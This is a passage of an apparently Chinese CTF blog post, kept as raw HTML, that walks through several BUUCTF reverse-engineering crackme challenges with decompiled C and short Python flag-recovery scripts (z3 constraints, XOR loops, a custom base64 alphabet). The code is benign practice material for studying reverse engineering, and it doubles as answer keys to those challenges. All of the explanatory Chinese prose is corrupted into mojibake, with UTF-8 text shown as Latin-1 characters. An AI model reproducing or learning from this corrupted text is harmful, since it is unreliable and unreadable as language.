= <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;input: &quot;</span>);</span><br><span class="line">    a2 = (v6 + <span class="number">4</span> * i);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_601078 = v6[j];</span><br><span class="line">    dword_60107C = HIDWORD(v6[j]);</span><br><span class="line">    a2 = &amp;unk_601060;</span><br><span class="line">    sub_400686(&amp;dword_601078, &amp;unk_601060);</span><br><span class="line">    LODWORD(v7[j]) = dword_601078;</span><br><span class="line">    HIDWORD(v7[j]) = dword_60107C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_400770(v7, a2) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO NO NO~ &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You seccess half\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do not forget to change input to hex and combine~\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ByeBye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯è¾“å…¥ï¼Œç„¶åè¿›è¡Œäº†ä¸€ä¸ªå˜æ¢ï¼Œå†è¿›è¡Œäº†ä¸€æ¬¡åˆ¤æ–­ã€‚</p><p>å…ˆçœ‹åˆ¤æ–­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400770</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">2</span>] - a1[<span class="number">3</span>] == <span class="number">2225223423LL</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">3</span>] + a1[<span class="number">4</span>] == <span class="number">4201428739LL</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">2</span>] - a1[<span class="number">4</span>] == <span class="number">1121399208LL</span></span><br><span class="line">    &amp;&amp; *a1 == <span class="number">-548868226</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">5</span>] == <span class="number">-2064448480</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">1</span>] == <span class="number">550153460</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨z3ç®€å•ç®—ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">a1 = [<span class="number">0</span>]*<span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    a1[i] = Int(<span class="string">&#x27;a1[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">s.add(a1[<span class="number">2</span>] - a1[<span class="number">3</span>] == <span class="number">0x84A236FF</span>)</span><br><span class="line">s.add(a1[<span class="number">3</span>] + a1[<span class="number">4</span>] == <span class="number">0xFA6CB703</span>)</span><br><span class="line">s.add(a1[<span class="number">2</span>] - a1[<span class="number">4</span>] == <span class="number">1121399208</span>)</span><br><span class="line">s.add(a1[<span class="number">0</span>] == -<span class="number">548868226</span>)</span><br><span class="line">s.add(a1[<span class="number">5</span>] == -<span class="number">2064448480</span>)</span><br><span class="line">s.add(a1[<span class="number">1</span>] == <span class="number">550153460</span>)</span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a1[2] = 3774025685,</span><br><span class="line"> a1[1] = 550153460,</span><br><span class="line"> a1[5] = -2064448480,</span><br><span class="line"> a1[0] = -548868226,</span><br><span class="line"> a1[3] = 1548802262,</span><br><span class="line"> a1[4] = 2652626477</span><br></pre></td></tr></table></figure><p>ä¹‹åå¾€å‰çœ‹æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400686</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *temp, <span class="keyword">int</span> *table)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *temp;</span><br><span class="line">  v4 = temp[<span class="number">1</span>];</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x3F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 += <span class="number">0x458BCD42</span>;</span><br><span class="line">    v3 += (v4 + v5 + <span class="number">11</span>) ^ ((v4 &lt;&lt; <span class="number">6</span>) + *table) ^ ((v4 &gt;&gt; <span class="number">9</span>) + table[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">    v4 += (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + table[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">9</span>) + table[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *temp = v3;</span><br><span class="line">  result = v4;</span><br><span class="line">  temp[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘çœ‹ç½‘ä¸Šéƒ½æ˜¯cå†™çš„ï¼Œæƒ³è¯•è¯•pyï¼Œä½†æ˜¯è¿˜è¦çœ‹å…¶ä»–çš„å†…å®¹ï¼Œå…ˆé¸½äº†</p><h1 id="0x14-MRCTF2020-Xor"><a href="#0x14-MRCTF2020-Xor" class="headerlink" title="0x14.[MRCTF2020]Xor"></a>0x14.[MRCTF2020]Xor</h1><p>ç®€å•çš„ä¸€ä¸ªå¼‚æˆ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">local = [<span class="number">0x4D</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x46</span>, <span class="number">0x58</span>, <span class="number">0x5A</span>, <span class="number">0x3A</span>,</span><br><span class="line">         <span class="number">0x4A</span>, <span class="number">0x3A</span>, <span class="number">0x60</span>, <span class="number">0x74</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x22</span>, <span class="number">0x4E</span>, <span class="number">0x40</span>, <span class="number">0x20</span>,</span><br><span class="line">         <span class="number">0x62</span>, <span class="number">0x70</span>, <span class="number">0x64</span>, <span class="number">0x64</span>, <span class="number">0x7D</span>, <span class="number">0x38</span>, <span class="number">0x67</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(local)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i ^ local[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="0x15-FlareOn4-IgniteMe"><a href="#0x15-FlareOn4-IgniteMe" class="headerlink" title="0x15.[FlareOn4]IgniteMe"></a>0x15.[FlareOn4]IgniteMe</h1><p>æ— å£³ï¼Œæ‰“å¼€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+0h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">  hFile = GetStdHandle(<span class="number">0xFFFFFFF6</span>);</span><br><span class="line">  dword_403074 = GetStdHandle(<span class="number">0xFFFFFFF5</span>);</span><br><span class="line">  WriteFile(dword_403074, aG1v3M3T3hFl4g, <span class="number">0x13</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  sub_4010F0();</span><br><span class="line">  <span class="keyword">if</span> ( sub_401050() )</span><br><span class="line">    WriteFile(dword_403074, aG00dJ0b, <span class="number">0xA</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    WriteFile(dword_403074, aN0tT00H0tRWe7r, <span class="number">0x24</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„sub_4010F0å°±æ˜¯å»äº†\rå’Œ\nï¼Œä¸‹é¢æ˜¯sub_401050ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_401050</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">  len = sub_401020(byte_403078);</span><br><span class="line">  v4 = sub_401000();</span><br><span class="line">  <span class="keyword">for</span> ( i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_403180[i] = v4 ^ byte_403078[i];</span><br><span class="line">    v4 = byte_403078[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">0x27</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( byte_403180[j] != local_str[j] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆæ˜¯ä¸ªå¼‚æˆ–ï¼Œä¸”v4ç¬¬ä¸€å¼€å§‹æ˜¯4ï¼Œè°ƒå‡ºæ¥çš„ï¼Œexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">local_str = [<span class="number">0x0D</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x17</span>, <span class="number">0x78</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x6C</span>,</span><br><span class="line">             <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x45</span>, <span class="number">0x12</span>, <span class="number">0x2F</span>, <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x44</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>,</span><br><span class="line">             <span class="number">0x56</span>, <span class="number">0x09</span>, <span class="number">0x5F</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>,</span><br><span class="line">             <span class="number">0x17</span>, <span class="number">0x48</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x69</span>]</span><br><span class="line">local_str.reverse()</span><br><span class="line">v4 = <span class="number">4</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(local_str)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(local_str[i] ^ v4)</span><br><span class="line">    v4 = local_str[i] ^ v4</span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h1 id="0x16-MRCTF2020-hello-world-go"><a href="#0x16-MRCTF2020-hello-world-go" class="headerlink" title="0x16.[MRCTF2020]hello_world_go"></a>0x16.[MRCTF2020]hello_world_go</h1><p>è¯´å®è¯æ²¡çœ‹æ‡‚åœ¨æå•¥ï¼Œå°±çœ‹åˆ°memequalå’Œcmpstringä¸¤ä¸ªå‡½æ•°å°±æ‹¿åˆ°flagäº†ã€‚</p><h1 id="0x17-WUSTCTF2020-level3"><a href="#0x17-WUSTCTF2020-level3" class="headerlink" title="0x17.[WUSTCTF2020]level3"></a>0x17.[WUSTCTF2020]level3</h1><p>æ˜¯ä¸€ä¸ªå˜è¡¨çš„base64ï¼Œè™½ç„¶èƒ½çœ‹åˆ°å˜è¡¨çš„å‡½æ•°ï¼Œä½†æ˜¯ä¸çŸ¥é“åœ¨å“ªé‡Œè°ƒç”¨çš„ã€‚ã€‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">string</span></span><br><span class="line">str0 = <span class="string">&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;</span></span><br><span class="line">string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">string1 = <span class="built_in">list</span>(</span><br><span class="line">    <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">10</span>):</span><br><span class="line">    string1[i], string1[<span class="number">19</span>-i] = string1[<span class="number">19</span>-i], string1[i]</span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&#x27;&#x27;.join(string1)</span></span><br><span class="line"><span class="string">print(base64.b64decode(str0.translate(str.maketrans(string1, string2))))</span></span><br></pre></td></tr></table></figure><h1 id="0x18-WUSTCTF2020-Cr0ssfun"><a href="#0x18-WUSTCTF2020-Cr0ssfun" class="headerlink" title="0x18.[WUSTCTF2020]Cr0ssfun"></a>0x18.[WUSTCTF2020]Cr0ssfun</h1><p>checké‡Œé¢å•¥éƒ½æœ‰</p><h1 id="0x19-FlareOn6-Overlong"><a href="#0x19-FlareOn6-Overlong" class="headerlink" title="0x19.[FlareOn6]Overlong"></a>0x19.[FlareOn6]Overlong</h1><p>idaä¸å¤ªä¼šæ”¹ï¼Œå°±odäº†ï¼Œé¦–å…ˆä»–æ˜¯å› ä¸ºpushäº†1cçš„é•¿åº¦ï¼Œè€Œéœ€è¦æ˜¾ç¤ºçš„é•¿åº¦è¿œå¤§äº0x1cï¼Œæ‰€ä»¥å°†å®ƒæ”¹å¤§ä¸€äº›å°±OKï¼Œè¿™é‡Œç›´æ¥åœ¨stackä¸Šæ”¹çš„ï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211031173412785.png" alt="image-20211031173412785"></p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211031173430925.png" alt="image-20211031173430925"></p><h1 id="0x1A-BJDCTF2020-BJD-hamburger-competition"><a href="#0x1A-BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="0x1A.[BJDCTF2020]BJD hamburger competition"></a>0x1A.[BJDCTF2020]BJD hamburger competition</h1><blockquote><p>  <strong>è¯†åˆ«Unityæ¸¸æˆ</strong></p><p>  Androidå¹³å°çš„apkåŒ…å¯ä»¥ç›´æ¥è§£å‹ï¼Œçœ‹æ˜¯å¦æœ‰./assets/bin/Data/Managedç›®å½•ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹libæ–‡ä»¶å¤¹ä¸‹é¢åŒ…å«çš„ä¸€äº›soï¼Œå¦‚æœæœ‰libmono,libunityç­‰æ¨¡å—ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯unityæ¸¸æˆäº†ã€‚</p><p>  Androidå¹³å°ä¸­C#ç¼–å†™çš„ä¸»é€»è¾‘æ¨¡å—ä»£ç é™æ€ç¼–è¾‘ä¹‹åå­˜å‚¨äºAssembly-CSharp.dllæ–‡ä»¶ä¸­ã€‚å› ä¸ºunityçš„è·¨å¹³å°ï¼ŒAndroidå¹³å°æ˜¯unityç¼–è¯‘çš„æ¸¸æˆï¼Œé‚£ä¹ˆå…¶å¯¹åº”çš„IOSå¹³å°ä¸Šä¹Ÿæ˜¯unityç¼–è¯‘å‡ºæ¥çš„ã€‚å¦‚æœå¸Œæœ›ç›´æ¥ä»IOSä¸Šé¢å»çœ‹æ˜¯å¦æ˜¯unityæ¸¸æˆï¼Œå¯ä»¥æå–æ¸¸æˆä¸­çš„ä¸»æ¨¡å—æŸ¥çœ‹æ˜¯å¦æœ‰unityä¹‹ç±»çš„å‡½æ•°å³å¯ã€‚</p><p>  è½¬è‡ªï¼š<a href="https://www.52pojie.cn/thread-495115-1-1.html">https://www.52pojie.cn/thread-495115-1-1.html</a></p></blockquote><p>ç¬¬ä¸€æ¬¡åšunityçš„é¢˜ï¼Œunityæ˜¯C++å†™çš„ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨dnspyç›´æ¥çœ‹æºç ï¼Œåœ¨BJD hamburger competition_Data\Managedæ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°Assembly-CSharp.dllï¼ˆè¿›å»æ–‡ä»¶åç¬¬ä¸€ä¸ªå°±æ˜¯ï¼‰ï¼Œè¿™ä¸ªdllæ–‡ä»¶æ˜¯ç¨‹åºçš„æºç ï¼Œç”¨æ¥å­˜æ”¾C++å·¥ç¨‹ã€‚</p><p>Assembly-CSharp.dllè¿™ä¸ªæ–‡ä»¶å¾ˆé‡è¦ã€‚</p><p>ä¹‹ååœ¨buttonspawnfruitçœ‹åˆ°ï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211031175420892.png" alt="image-20211031175420892"></p><p>è§£å¯†ä¹‹åmd5ï¼Œè¦æ³¨æ„çš„æ˜¯md5è¿”å›çš„æ˜¯å‰20ä½ï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211031175939675.png" alt="image-20211031175939675"></p><h1 id="0x1B-ACTFæ–°ç”Ÿèµ›2020-Oruga"><a href="#0x1B-ACTFæ–°ç”Ÿèµ›2020-Oruga" class="headerlink" title="0x1B.[ACTFæ–°ç”Ÿèµ›2020]Oruga"></a>0x1B.[ACTFæ–°ç”Ÿèµ›2020]Oruga</h1><p>é‡ç‚¹åœ¨sub_78A</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">6</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">6</span>]; <span class="comment">// [rsp+Ah] [rbp-36h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x19</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me the flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s2, <span class="string">&quot;actf&#123;&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    s1[i] = input[i];</span><br><span class="line">  s1[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_78A(input) )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s True Flag!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t stop trying...&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Format false!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_78A:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_78A</span><span class="params">(<span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> now; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  now = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">5</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">map</span>[now] != <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    now -= v4;</span><br><span class="line">    <span class="keyword">if</span> ( input[v3] != <span class="string">&#x27;W&#x27;</span> || v4 == <span class="number">0xFFFFFFF0</span> )</span><br><span class="line">   